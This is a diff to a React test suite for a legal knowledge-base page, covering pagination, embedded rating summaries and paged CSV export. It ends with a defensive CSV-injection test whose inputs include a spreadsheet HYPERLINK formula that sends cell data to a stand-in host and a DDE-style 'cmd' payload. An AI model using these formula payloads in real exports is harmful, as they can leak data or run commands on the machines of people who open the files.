@@ -5,7 +5,7 @@ import { render, screen, waitFor, within } from "@testing-library/react";
 import userEvent from "@testing-library/user-event";
 import { beforeEach, describe, expect, it, vi } from "vitest";
 
-import type { Assertion, RatingSummary } from "../../api/types";
+import type { AssertionList, AssertionListItem, AssertionListParams } from "../../api/types";
 import { KnowledgeBasePage } from "../KnowledgeBasePage";
 
 vi.mock("../../api/client", () => ({
@@ -41,7 +41,7 @@ const mockedApi = api as unknown as {
   ratingSummary: ReturnType<typeof vi.fn>;
 };
 
-const a1: Assertion = {
+const a1: AssertionListItem = {
   id: "a1",
   organization_id: "o1",
   repository_id: "r1",
@@ -67,9 +67,20 @@ const a1: Assertion = {
   superseded_by_assertion_id: null,
   current_revision_number: 3,
   evidence_status: "evidenced",
+  // GET /assertions embeds the current revision's rating aggregate.
+  ratings_summary: {
+    assertion_id: "a1",
+    assertion_revision_id: "rev-3",
+    count: 12,
+    average: 3.8,
+    median: 4,
+    distribution: { "1": 1, "2": 1, "3": 2, "4": 5, "5": 3 },
+  },
+  current_user_rating: null,
+  last_activity_at: "2026-07-21T10:00:00Z",
 };
 
-const a2: Assertion = {
+const a2: AssertionListItem = {
   ...a1,
   id: "a2",
   proposition: "Termination for convenience requires 60 days written notice.",
@@ -79,34 +90,54 @@ const a2: Assertion = {
   jurisdiction: null,
   current_revision_number: null,
   evidence_status: "awaiting_evidence",
+  ratings_summary: null,
 };
 
-const summaryFixture: RatingSummary = {
-  count: 12,
-  average: 3.8,
-  median: 4,
-  distribution: { "1": 1, "2": 1, "3": 2, "4": 5, "5": 3 },
-  assertion_id: "a1",
-  assertion_revision_id: "rev-3",
-  current_user_rating: null,
-  rationale_count: 2,
-};
+/** A stand-in for GET /assertions over `rows`, honouring limit and offset. */
+function serve(rows: AssertionListItem[]) {
+  return async (_matterId: string, params: AssertionListParams = {}): Promise<AssertionList> => {
+    const offset = params.offset ?? 0;
+    const end = params.limit === undefined ? rows.length : offset + params.limit;
+    return { items: rows.slice(offset, end), total: rows.length, limit: params.limit ?? null, offset };
+  };
+}
 
-beforeEach(() => {
+function manyRows(count: number): AssertionListItem[] {
+  return Array.from({ length: count }, (_, i) => ({
+    ...a1,
+    id: `row-${i}`,
+    proposition: `Proposition number ${i}.`,
+  }));
+}
+
+/** Set the hash and let its (asynchronous) hashchange fire before anything
+ * renders: in the app a page mounts in response to that event, never before. */
+async function setHash(hash: string): Promise<void> {
+  const target = hash === "" || hash === "#" ? "" : hash.startsWith("#") ? hash : `#${hash}`;
+  if (window.location.hash === target) return;
+  await new Promise<void>((resolve) => {
+    window.addEventListener("hashchange", () => resolve(), { once: true });
+    window.location.hash = hash;
+  });
+}
+
+beforeEach(async () => {
+  await setHash("");
   mockedApi.listAssertions.mockReset();
   mockedApi.ratingSummary.mockReset();
-  mockedApi.listAssertions.mockResolvedValue({ items: [a1, a2], total: 2 });
-  mockedApi.ratingSummary.mockResolvedValue(summaryFixture);
+  mockedApi.listAssertions.mockImplementation(serve([a1, a2]));
 });
 
 describe("KnowledgeBasePage", () => {
-  it("loads accepted assertions by default and renders the table", async () => {
+  it("loads the first page of accepted assertions by default and renders the table", async () => {
     render(<KnowledgeBasePage />);
 
     expect(await screen.findByText(a1.proposition)).toBeInTheDocument();
     expect(mockedApi.listAssertions).toHaveBeenCalledWith("m1", {
       status: "accepted",
       sort: "-created_at",
+      limit: 50,
+      offset: 0,
     });
 
     // Matter name in the subtitle; propositions link to the detail page.
@@ -125,7 +156,9 @@ describe("KnowledgeBasePage", () => {
     expect(table.getByText("Awaiting evidence")).toBeInTheDocument();
     expect(table.getByText(/82% model confidence/)).toBeInTheDocument();
 
-    expect(screen.getByText("Showing 2 of 2 assertions")).toBeInTheDocument();
+    expect(screen.getByText("Showing 1–2 of 2 assertions")).toBeInTheDocument();
+    // One page holds everything: no pager.
+    expect(screen.queryByRole("button", { name: "Next" })).not.toBeInTheDocument();
 
     // Read-only page: no review or rating actions for any role (viewer here).
     expect(
@@ -133,14 +166,16 @@ describe("KnowledgeBasePage", () => {
     ).not.toBeInTheDocument();
   });
 
-  it("fetches a rating summary per row with a revision and renders it", async () => {
+  it("renders the rating summary embedded in each row, with no request per row", async () => {
     render(<KnowledgeBasePage />);
 
     expect(await screen.findByText("avg 3.8 · 12 ratings")).toBeInTheDocument();
-    // Only a1 has a current revision; a2 (no revision) must not be fetched.
-    expect(mockedApi.ratingSummary).toHaveBeenCalledTimes(1);
-    expect(mockedApi.ratingSummary).toHaveBeenCalledWith("a1", 3);
+    // ui:1: one rating-summary request per row exhausted the browser at
+    // matter scale (2,036 rows: 680 failed requests, every cell "—").
+    expect(mockedApi.ratingSummary).not.toHaveBeenCalled();
+    expect(mockedApi.listAssertions).toHaveBeenCalledTimes(1);
 
+    // a2 has no rating aggregate (unrated, or no revision row).
     const row2 = screen.getByText(a2.proposition).closest("tr");
     expect(row2).not.toBeNull();
     expect(within(row2 as HTMLElement).getByText("—")).toBeInTheDocument();
@@ -149,6 +184,148 @@ describe("KnowledgeBasePage", () => {
     expect(
       screen.getByText(/independent of review status and model confidence/i),
     ).toBeInTheDocument();
+  });
+
+  it("shows at most one page of a large matter, from one request", async () => {
+    // A definition-link run writes tens of thousands of accepted assertions.
+    mockedApi.listAssertions.mockImplementation(serve(manyRows(20_000)));
+    render(<KnowledgeBasePage />);
+
+    await screen.findByText("Proposition number 0.");
+    const table = within(screen.getByRole("table"));
+    expect(table.getAllByRole("row")).toHaveLength(51); // header + 50
+    expect(screen.getByText("Showing 1–50 of 20,000 assertions")).toBeInTheDocument();
+    expect(screen.getByText("Page 1 of 400")).toBeInTheDocument();
+    expect(mockedApi.listAssertions).toHaveBeenCalledTimes(1);
+    expect(mockedApi.ratingSummary).not.toHaveBeenCalled();
+  });
+
+  it("pages with Previous and Next", async () => {
+    mockedApi.listAssertions.mockImplementation(serve(manyRows(120)));
+    const user = userEvent.setup();
+    render(<KnowledgeBasePage />);
+
+    await screen.findByText("Proposition number 0.");
+    expect(screen.getByText("Showing 1–50 of 120 assertions")).toBeInTheDocument();
+    expect(screen.getByRole("button", { name: "Previous" })).toBeDisabled();
+
+    await user.click(screen.getByRole("button", { name: "Next" }));
+    expect(await screen.findByText("Proposition number 50.")).toBeInTheDocument();
+    expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
+      status: "accepted",
+      sort: "-created_at",
+      limit: 50,
+      offset: 50,
+    });
+    expect(screen.queryByText("Proposition number 0.")).not.toBeInTheDocument();
+    expect(screen.getByText("Showing 51–100 of 120 assertions")).toBeInTheDocument();
+
+    await user.click(screen.getByRole("button", { name: "Next" }));
+    expect(await screen.findByText("Proposition number 119.")).toBeInTheDocument();
+    expect(screen.getByText("Showing 101–120 of 120 assertions")).toBeInTheDocument();
+    expect(screen.getByText("Page 3 of 3")).toBeInTheDocument();
+    expect(screen.getByRole("button", { name: "Next" })).toBeDisabled();
+
+    await user.click(screen.getByRole("button", { name: "Previous" }));
+    expect(await screen.findByText("Proposition number 50.")).toBeInTheDocument();
+    expect(mockedApi.listAssertions).toHaveBeenLastCalledWith(
+      "m1",
+      expect.objectContaining({ offset: 50 }),
+    );
+  });
+
+  it("returns to the first page whenever the search, a filter or the sort changes", async () => {
+    mockedApi.listAssertions.mockImplementation(serve(manyRows(120)));
+    const user = userEvent.setup();
+    render(<KnowledgeBasePage />);
+    await screen.findByText("Proposition number 0.");
+
+    const toPage2 = async () => {
+      await user.click(screen.getByRole("button", { name: "Next" }));
+      await screen.findByText("Proposition number 50.");
+    };
+    const lastOffset = () => mockedApi.listAssertions.mock.lastCall?.[1].offset;
+
+    await toPage2();
+    await user.selectOptions(screen.getByLabelText("Status"), "");
+    await waitFor(() =>
+      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
+        sort: "-created_at",
+        limit: 50,
+        offset: 0,
+      }),
+    );
+    await screen.findByText("Proposition number 0.");
+
+    await toPage2();
+    await user.selectOptions(screen.getByLabelText("Origin"), "model_suggested");
+    await waitFor(() => expect(lastOffset()).toBe(0));
+    await screen.findByText("Proposition number 0.");
+
+    await toPage2();
+    await user.selectOptions(screen.getByLabelText("Sort"), "proposition");
+    await waitFor(() => expect(lastOffset()).toBe(0));
+    await screen.findByText("Proposition number 0.");
+
+    await toPage2();
+    await user.type(screen.getByLabelText("Search assertions"), "number");
+    await waitFor(() =>
+      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith(
+        "m1",
+        expect.objectContaining({ q: "number", offset: 0 }),
+      ),
+    );
+    // Every request stayed one bounded page.
+    for (const [, params] of mockedApi.listAssertions.mock.calls) {
+      expect(params.limit).toBe(50);
+    }
+  });
+
+  it("starts at the first page when a filter returns to an earlier value", async () => {
+    mockedApi.listAssertions.mockImplementation(serve(manyRows(120)));
+    const user = userEvent.setup();
+    render(<KnowledgeBasePage />);
+    await screen.findByText("Proposition number 0.");
+    await user.click(screen.getByRole("button", { name: "Next" }));
+    await screen.findByText("Proposition number 50.");
+
+    await user.selectOptions(screen.getByLabelText("Origin"), "model_suggested");
+    await screen.findByText("Proposition number 0.");
+    await user.selectOptions(screen.getByLabelText("Origin"), "");
+
+    await waitFor(() =>
+      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
+        status: "accepted",
+        sort: "-created_at",
+        limit: 50,
+        offset: 0,
+      }),
+    );
+    expect(screen.getByText("Showing 1–50 of 120 assertions")).toBeInTheDocument();
+  });
+
+  it("steps back to the last page when rows disappear from under it", async () => {
+    let rows = manyRows(120);
+    mockedApi.listAssertions.mockImplementation((m: string, p: AssertionListParams) =>
+      serve(rows)(m, p),
+    );
+    const user = userEvent.setup();
+    render(<KnowledgeBasePage />);
+    await screen.findByText("Proposition number 0.");
+    await user.click(screen.getByRole("button", { name: "Next" }));
+    await screen.findByText("Proposition number 50.");
+
+    // 30 rows leave the result set (reviewed elsewhere) before Next: page 3
+    // no longer exists, so the page shows the last one that does.
+    rows = manyRows(90);
+    await user.click(screen.getByRole("button", { name: "Next" }));
+    await waitFor(() =>
+      expect(screen.getByText("Showing 51–90 of 90 assertions")).toBeInTheDocument(),
+    );
+    expect(screen.getByText("Proposition number 89.")).toBeInTheDocument();
+    const offsets = mockedApi.listAssertions.mock.calls.map(([, params]) => params.offset);
+    expect(offsets).toEqual([0, 50, 100, 50]);
+    expect(screen.queryByText("No assertions found")).not.toBeInTheDocument();
   });
 
   it("refetches when status, origin, or sort change", async () => {
@@ -160,6 +337,8 @@ describe("KnowledgeBasePage", () => {
     await waitFor(() =>
       expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
         sort: "-created_at",
+        limit: 50,
+        offset: 0,
       }),
     );
 
@@ -168,6 +347,8 @@ describe("KnowledgeBasePage", () => {
       expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
         origin: "model_suggested",
         sort: "-created_at",
+        limit: 50,
+        offset: 0,
       }),
     );
 
@@ -176,8 +357,36 @@ describe("KnowledgeBasePage", () => {
       expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
         origin: "model_suggested",
         sort: "proposition",
+        limit: 50,
+        offset: 0,
       }),
     );
+  });
+
+  it("sorts by ratings on the server and says that order is user opinion", async () => {
+    const user = userEvent.setup();
+    render(<KnowledgeBasePage />);
+    await screen.findByText(a1.proposition);
+    expect(screen.queryByText(/user opinion/)).not.toBeInTheDocument();
+
+    await user.selectOptions(screen.getByLabelText("Sort"), "-average_rating");
+    await waitFor(() =>
+      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith(
+        "m1",
+        expect.objectContaining({ sort: "-average_rating", offset: 0 }),
+      ),
+    );
+    // Spec §17: sorting by rating reflects user opinion, not legal authority.
+    expect(screen.getByText(/user opinion, not legal authority/)).toBeInTheDocument();
+
+    await user.selectOptions(screen.getByLabelText("Sort"), "-rating_count");
+    await waitFor(() =>
+      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith(
+        "m1",
+        expect.objectContaining({ sort: "-rating_count" }),
+      ),
+    );
+    expect(screen.getByText(/user opinion, not legal authority/)).toBeInTheDocument();
   });
 
   it("searches with a debounced q param", async () => {
@@ -198,13 +407,15 @@ describe("KnowledgeBasePage", () => {
   it("reads ?q= from the hash as a search across every status", async () => {
     // ?q= is the topbar's global search (ui:22): it must find assertions in
     // any status the viewer can see, not only the accepted catalog.
-    window.location.hash = "#/knowledge?q=capacity";
+    await setHash("#/knowledge?q=capacity");
     const view = render(<KnowledgeBasePage />);
 
     await screen.findByText(a1.proposition);
     expect(mockedApi.listAssertions).toHaveBeenCalledWith("m1", {
       q: "capacity",
       sort: "-created_at",
+      limit: 50,
+      offset: 0,
     });
     // One request: the search does not first load the accepted catalog.
     expect(mockedApi.listAssertions).toHaveBeenCalledTimes(1);
@@ -223,7 +434,7 @@ describe("KnowledgeBasePage", () => {
     );
 
     view.unmount();
-    window.location.hash = "";
+    await setHash("");
   });
 
   it("offers every review status in the Status filter", async () => {
@@ -253,12 +464,14 @@ describe("KnowledgeBasePage", () => {
       expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
         status: "revision_requested",
         sort: "-created_at",
+        limit: 50,
+        offset: 0,
       }),
     );
   });
 
   it("shows an empty state when nothing matches", async () => {
-    mockedApi.listAssertions.mockResolvedValue({ items: [], total: 0 });
+    mockedApi.listAssertions.mockImplementation(serve([]));
     render(<KnowledgeBasePage />);
 
     expect(await screen.findByText("No assertions found")).toBeInTheDocument();
@@ -280,40 +493,92 @@ describe("KnowledgeBasePage", () => {
     expect(mockedApi.listAssertions).toHaveBeenCalledTimes(2);
   });
 
-  it("exports the loaded rows as a client-side CSV", async () => {
-    const user = userEvent.setup();
+  it("exports every match as CSV, paging through the list 500 rows at a time", async () => {
+    // More than one export page, and more than the 50 rows on screen.
+    const rows = [...manyRows(1_202), a2];
+    mockedApi.listAssertions.mockImplementation(serve(rows));
+
+    const { text, revokeObjectURL } = await exportCsv("Proposition number 0.");
+
+    const lines = text.split("\r\n");
+    expect(lines[0]).toBe(
+      "Proposition,Type,Jurisdiction,Origin,Status,Standing,Evidence,Avg rating,Ratings,Updated",
+    );
+    expect(lines).toHaveLength(1 + rows.length);
+    expect(lines[1]).toBe(
+      "Proposition number 0.,obligation,IL,Colleague,accepted,accepted,evidenced,3.80,12,2026-07-20T10:00:00Z",
+    );
+    expect(text).toContain("\r\nProposition number 1201.,");
+    // A row without a rating aggregate: no average, zero ratings.
+    expect(lines[lines.length - 1]).toBe(
+      `${a2.proposition},obligation,,AI-deduced,accepted,accepted,awaiting_evidence,,0,2026-07-20T10:00:00Z`,
+    );
+    // The export used the page's filters and sort, 500 rows per request.
+    const exportCalls = mockedApi.listAssertions.mock.calls
+      .map(([, params]) => params as AssertionListParams)
+      .filter((params) => params.limit === 500);
+    expect(exportCalls).toEqual([
+      { status: "accepted", sort: "-created_at", limit: 500, offset: 0 },
+      { status: "accepted", sort: "-created_at", limit: 500, offset: 500 },
+      { status: "accepted", sort: "-created_at", limit: 500, offset: 1000 },
+    ]);
+    expect(mockedApi.ratingSummary).not.toHaveBeenCalled();
+    expect(revokeObjectURL).toHaveBeenCalledWith("blob:lexgraph");
+  });
+
+  it("shows export progress and can cancel it", async () => {
+    let releaseSecondPage: () => void = () => {};
+    const rows = manyRows(700);
+    mockedApi.listAssertions.mockImplementation(
+      async (m: string, params: AssertionListParams = {}) => {
+        if (params.limit === 500 && params.offset === 500) {
+          await new Promise<void>((resolve) => {
+            releaseSecondPage = resolve;
+          });
+        }
+        return serve(rows)(m, params);
+      },
+    );
     const createObjectURL = vi.fn((_blob: Blob) => "blob:lexgraph");
-    const revokeObjectURL = vi.fn();
-    Object.assign(URL, { createObjectURL, revokeObjectURL });
-    const click = vi
-      .spyOn(HTMLAnchorElement.prototype, "click")
-      .mockImplementation(() => {});
+    Object.assign(URL, { createObjectURL, revokeObjectURL: vi.fn() });
+    const user = userEvent.setup();
+    render(<KnowledgeBasePage />);
+    await screen.findByText("Proposition number 0.");
 
-    try {
-      render(<KnowledgeBasePage />);
-      await screen.findByText(a1.proposition);
+    await user.click(screen.getByRole("button", { name: "Export CSV" }));
+    expect(await screen.findByRole("status")).toHaveTextContent("Exporting 500 of 700");
+    expect(screen.getByRole("button", { name: "Export CSV" })).toBeDisabled();
 
-      await user.click(screen.getByRole("button", { name: "Export CSV" }));
+    await user.click(screen.getByRole("button", { name: "Cancel export" }));
+    releaseSecondPage();
+    await waitFor(() =>
+      expect(screen.getByRole("button", { name: "Export CSV" })).toBeEnabled(),
+    );
+    expect(screen.queryByRole("status")).not.toBeInTheDocument();
+    expect(createObjectURL).not.toHaveBeenCalled();
+  });
 
-      expect(click).toHaveBeenCalledTimes(1);
-      expect(createObjectURL).toHaveBeenCalledTimes(1);
-      const blob = createObjectURL.mock.calls[0][0];
-      // jsdom's Blob has no .text(); go through FileReader instead.
-      const text = await new Promise<string>((resolve, reject) => {
-        const reader = new FileReader();
-        reader.onload = () => resolve(reader.result as string);
-        reader.onerror = () => reject(reader.error);
-        reader.readAsText(blob);
-      });
-      expect(text).toContain(
-        "Proposition,Type,Jurisdiction,Origin,Status,Standing,Evidence,Avg rating,Ratings,Updated",
-      );
-      expect(text).toContain(a1.proposition);
-      expect(text).toContain("AI-deduced");
-      expect(revokeObjectURL).toHaveBeenCalledWith("blob:lexgraph");
-    } finally {
-      click.mockRestore();
-    }
+  it("reports a failed export instead of downloading part of it", async () => {
+    const rows = manyRows(700);
+    mockedApi.listAssertions.mockImplementation(
+      async (m: string, params: AssertionListParams = {}) => {
+        if (params.limit === 500 && params.offset === 500) throw new Error("Server went away");
+        return serve(rows)(m, params);
+      },
+    );
+    const createObjectURL = vi.fn((_blob: Blob) => "blob:lexgraph");
+    Object.assign(URL, { createObjectURL, revokeObjectURL: vi.fn() });
+    const user = userEvent.setup();
+    render(<KnowledgeBasePage />);
+    await screen.findByText("Proposition number 0.");
+
+    await user.click(screen.getByRole("button", { name: "Export CSV" }));
+
+    expect(await screen.findByRole("alert")).toHaveTextContent(
+      "CSV export failed: Server went away",
+    );
+    expect(createObjectURL).not.toHaveBeenCalled();
+    expect(screen.getByRole("button", { name: "Export CSV" })).toBeEnabled();
   });
 
   it("neutralizes cells a spreadsheet would evaluate as formulas (CSV injection)", async () => {
@@ -328,14 +593,10 @@ describe("KnowledgeBasePage", () => {
       "\rleading carriage return",
       " =1+1",
     ];
-    mockedApi.listAssertions.mockResolvedValue({
-      items: [
-        ...propositions.map((proposition, i) => ({ ...a1, id: `f${i}`, proposition })),
-        a2,
-      ],
-      total: propositions.length + 1,
-    });
-    const text = await exportedCsv();
+    mockedApi.listAssertions.mockImplementation(
+      serve([...propositions.map((proposition, i) => ({ ...a1, id: `f${i}`, proposition })), a2]),
+    );
+    const { text } = await exportCsv(a2.proposition);
 
     expect(text).toContain(`\r\n"'=HYPERLINK(""http://evil.example/?x=""&A2,""click me"")",`);
     expect(text).toContain("\r\n'+1+cmd|' /C calc'!A0,");
@@ -352,24 +613,28 @@ describe("KnowledgeBasePage", () => {
   });
 });
 
-/** Click Export CSV and return the downloaded file's text. */
-async function exportedCsv(): Promise<string> {
+/** Render, wait for `readyText`, click Export CSV and return the downloaded file's text. */
+async function exportCsv(readyText: string) {
   const user = userEvent.setup();
   const createObjectURL = vi.fn((_blob: Blob) => "blob:lexgraph");
-  Object.assign(URL, { createObjectURL, revokeObjectURL: vi.fn() });
+  const revokeObjectURL = vi.fn();
+  Object.assign(URL, { createObjectURL, revokeObjectURL });
   const click = vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
   try {
     render(<KnowledgeBasePage />);
-    await screen.findByText(a2.proposition);
+    await screen.findByText(readyText);
     await user.click(screen.getByRole("button", { name: "Export CSV" }));
-    await waitFor(() => expect(createObjectURL).toHaveBeenCalledTimes(1));
+    await waitFor(() => expect(click).toHaveBeenCalledTimes(1));
+    expect(createObjectURL).toHaveBeenCalledTimes(1);
     const blob = createObjectURL.mock.calls[0][0];
-    return await new Promise<string>((resolve, reject) => {
+    // jsdom's Blob has no .text(); go through FileReader instead.
+    const text = await new Promise<string>((resolve, reject) => {
       const reader = new FileReader();
       reader.onload = () => resolve(reader.result as string);
       reader.onerror = () => reject(reader.error);
       reader.readAsText(blob);
     });
+    return { text, revokeObjectURL };
   } finally {
     click.mockRestore();
   }
